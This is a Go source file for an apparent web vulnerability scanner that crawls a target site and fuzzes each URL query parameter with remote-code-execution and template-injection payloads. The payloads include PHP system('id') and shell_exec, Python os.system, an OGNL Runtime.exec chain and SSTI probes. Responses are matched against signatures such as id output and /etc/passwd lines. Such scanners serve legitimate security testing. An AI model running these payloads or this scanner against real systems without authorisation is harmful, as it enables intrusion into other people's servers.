package vuln

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/PuerkitoBio/goquery"
)

// --- RCE Scanner Implementation ---

// FindingRCE describes a discovered potential Remote Code Execution
type FindingRCE struct {
	Type            string `json:"type"`
	URL             string `json:"url"`
	Param           string `json:"param"`
	Payload         string `json:"payload"`
	ResponseSnippet string `json:"response_snippet"`
	Evidence        string `json:"evidence"`
	Timestamp       string `json:"timestamp"`
}

// RCEScanner holds the state for the RCE scan
type RCEScanner struct {
	StartURL    *url.URL
	Client      *http.Client
	Visited     map[string]bool
	VisitedMu   sync.RWMutex
	Queue       chan rceCrawlJob
	Findings    []FindingRCE
	FindingsMu  sync.Mutex
	Workers     int
	Active      int32
	MaxPages    int
	PageCount   int
	PageCountMu sync.Mutex
	MaxDepth    int
	Payloads    []string
	Throttle    time.Duration
}

// rceCrawlJob represents a URL to be scanned
type rceCrawlJob struct {
	URL   string
	Depth int
}

// init registers the RCE check
func init() {
	vulns = append(vulns, VulnCheck{
		Name:    "RCE (Basic)",
		Param:   "cmd",
		Payload: "echo knife",
		Match:   `knife`,
		Method:  "GET",
	})
}

// NewRCEScanner creates a new instance of the RCE scanner
func NewRCEScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration) (*RCEScanner, error) {
	parsed, err := url.Parse(start)
	if err != nil {
		return nil, err
	}
	client := &http.Client{
		Timeout: 20 * time.Second,
	}

	s := &RCEScanner{
		StartURL: parsed,
		Client:   client,
		Visited:  make(map[string]bool),
		Queue:    make(chan rceCrawlJob, 1000),
		Findings: []FindingRCE{},
		Workers:  workers,
		MaxPages: maxPages,
		MaxDepth: maxDepth,
		Throttle: throttle,
		Payloads: generateRCEPayloads(),
	}
	return s, nil
}

// Run starts the scanning process
func (s *RCEScanner) Run() {
	var wg sync.WaitGroup
	for i := 0; i < s.Workers; i++ {
		wg.Add(1)
		go s.worker(&wg)
	}

	s.enqueue(s.StartURL.String(), 0)

	for {
		time.Sleep(500 * time.Millisecond)
		s.PageCountMu.Lock()
		done := s.PageCount >= s.MaxPages
		s.PageCountMu.Unlock()

		if len(s.Queue) == 0 && atomic.LoadInt32(&s.Active) == 0 {
			if done {
				break
			}
			time.Sleep(1 * time.Second)
			if len(s.Queue) == 0 && atomic.LoadInt32(&s.Active) == 0 {
				break
			}
		}
	}
	close(s.Queue)
	wg.Wait()
}

func (s *RCEScanner) worker(wg *sync.WaitGroup) {
	defer wg.Done()
	for job := range s.Queue {
		atomic.AddInt32(&s.Active, 1)
		s.PageCountMu.Lock()
		if s.PageCount >= s.MaxPages {
			s.PageCountMu.Unlock()
			atomic.AddInt32(&s.Active, -1)
			return
		}
		s.PageCountMu.Unlock()

		if !s.markVisited(job.URL) {
			atomic.AddInt32(&s.Active, -1)
			continue
		}

		log.Printf("[RCE Scan] Visiting %s (Depth: %d)\n", job.URL, job.Depth)

		s.fuzzURL(job.URL)

		if job.Depth < s.MaxDepth {
			s.crawl(job.URL, job.Depth)
		}
		atomic.AddInt32(&s.Active, -1)
	}
}

func (s *RCEScanner) crawl(u string, depth int) {
	resp, err := s.Client.Get(u)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	ct := resp.Header.Get("Content-Type")
	if !strings.Contains(strings.ToLower(ct), "text/html") {
		return
	}

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return
	}

	doc.Find("a[href]").Each(func(i int, sel *goquery.Selection) {
		href, exists := sel.Attr("href")
		if !exists {
			return
		}
		absoluteURL, err := s.normalize(u, href)
		if err == nil {
			s.enqueue(absoluteURL, depth+1)
		}
	})
}

func (s *RCEScanner) fuzzURL(rawURL string) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return
	}

	query := u.Query()
	if len(query) == 0 {
		return
	}

	for param, values := range query {
		originalValue := values[0]

		for _, payload := range s.Payloads {
			if s.Throttle > 0 {
				time.Sleep(s.Throttle)
			}

			newQuery := u.Query()
			newQuery.Set(param, payload)
			u.RawQuery = newQuery.Encode()
			testURL := u.String()

			req, err := http.NewRequest("GET", testURL, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Knife-RCE-Scanner/1.0")

			resp, err := s.Client.Do(req)
			if err != nil {
				continue
			}

			bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 50000))
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyStr := string(bodyBytes)

			if evidence, found := s.detectRCE(bodyStr); found {
				s.addFinding(FindingRCE{
					Type:            "Remote Code Execution",
					URL:             testURL,
					Param:           param,
					Payload:         payload,
					ResponseSnippet: snippet(bodyStr, 200),
					Evidence:        evidence,
				})
			}
		}
		_ = originalValue
	}
}

func (s *RCEScanner) detectRCE(body string) (string, bool) {
	signatures := []struct {
		Pattern *regexp.Regexp
		Name    string
	}{
		{regexp.MustCompile(`uid=\d+\(.*\)\s+gid=\d+\(.*\)`), "id command output"},
		{regexp.MustCompile(`phpinfo\(\)`), "phpinfo output"},
		{regexp.MustCompile(`PHP Version`), "PHP Version Banner"},
		{regexp.MustCompile(`root:x:0:0`), "/etc/passwd content"},
		{regexp.MustCompile(`java\.lang\.Runtime`), "Java Runtime Error"},
	}

	for _, sig := range signatures {
		if sig.Pattern.MatchString(body) {
			match := sig.Pattern.FindString(body)
			return fmt.Sprintf("Matched signature: %s (%s)", sig.Name, match), true
		}
	}

	return "", false
}

func generateRCEPayloads() []string {
	return []string{
		// PHP
		"phpinfo()",
		"system('id')",
		"exec('id')",
		"shell_exec('id')",
		"passthru('id')",
		"`id`",
		"${system('id')}",
		// Python
		"import os; os.system('id')",
		"__import__('os').system('id')",
		// Java (OGNL)
		"${#context['xwork.MethodAccessor.denyMethodExecution']=false, #_memberAccess['allowStaticMethodAccess']=true, @java.lang.Runtime@getRuntime().exec('id')}",
		// Template Injection (SSTI)
		"{{7*7}}",
		"${7*7}",
		"<%= 7*7 %>",
		"#{7*7}",
		"*{7*7}",
	}
}

func (s *RCEScanner) markVisited(u string) bool {
	s.VisitedMu.Lock()
	defer s.VisitedMu.Unlock()
	if s.Visited[u] {
		return false
	}
	s.Visited[u] = true
	s.PageCountMu.Lock()
	s.PageCount++
	s.PageCountMu.Unlock()
	return true
}

func (s *RCEScanner) enqueue(u string, depth int) {
	u = strings.Split(u, "#")[0]
	s.VisitedMu.RLock()
	if s.Visited[u] {
		s.VisitedMu.RUnlock()
		return
	}
	s.VisitedMu.RUnlock()

	select {
	case s.Queue <- rceCrawlJob{URL: u, Depth: depth}:
	default:
	}
}

func (s *RCEScanner) addFinding(f FindingRCE) {
	s.FindingsMu.Lock()
	defer s.FindingsMu.Unlock()
	f.Timestamp = time.Now().Format(time.RFC3339)
	s.Findings = append(s.Findings, f)
	log.Printf("[!] RCE FOUND: %s (Param: %s)\n", f.URL, f.Param)
}

func (s *RCEScanner) normalize(base, href string) (string, error) {
	b, err := url.Parse(base)
	if err != nil {
		return "", err
	}
	h, err := url.Parse(href)
	if err != nil {
		return "", err
	}
	resolved := b.ResolveReference(h)
	return resolved.String(), nil
}

func RunRCEScan(target string, headers map[string]string, cookies string, reportPath string) error {
	fmt.Println("[*] Starting RCE Scanner on", target)

	scanner, err := NewRCEScanner(target, 10, 100, 3, 200*time.Millisecond)
	if err != nil {
		return err
	}

	scanner.Run()

	fmt.Printf("[*] Scan complete. Found %d potential RCEs.\n", len(scanner.Findings))

	return err
}
